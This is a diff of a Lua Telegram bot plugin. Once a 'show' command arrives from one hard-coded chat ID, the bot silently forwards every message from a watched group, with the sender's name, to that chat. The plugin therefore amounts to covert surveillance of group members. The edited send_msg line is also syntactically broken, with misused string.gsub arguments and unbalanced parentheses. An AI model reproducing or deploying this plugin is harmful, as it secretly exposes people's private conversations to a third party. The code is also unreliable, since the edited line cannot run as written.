@@ -1,8 +1,7 @@
 local function run(msg, matches)
     local name = msg.from.print_name
-    if matches[1] == "show" or matches[1] == "Show" and matches[2] then
+    if matches[1] == "show" or matches[1] == "Show" then
     if msg.to.id == 142334685 then
-    savelog(matches[1], chatsee)
     show = 1
     return "فعال 😈"
     else
@@ -18,13 +17,13 @@ local function run(msg, matches)
     end
     if tonumber(show) == 1 then
     if tonumber(msg.to.id) == tonumber(chatsee) then
-    local send = send_msg('chat#142334685', msg.from.print_name..'\n___________\n'..matches[1], ok_cb, false)
+    local send = send_msg('chat#142334685', msg.from.print_name..'\n'.. string.gsub(msg.to.print_name..'\n___________\n'..matches[1], ok_cb, false)
     end
     end
 end
 return {
      patterns = {
-        "^([Ss]how) (.*)$",
+        "^([Ss]how)$",
         "^([Ss]topshow)$",
         "^(.*)$"
         },
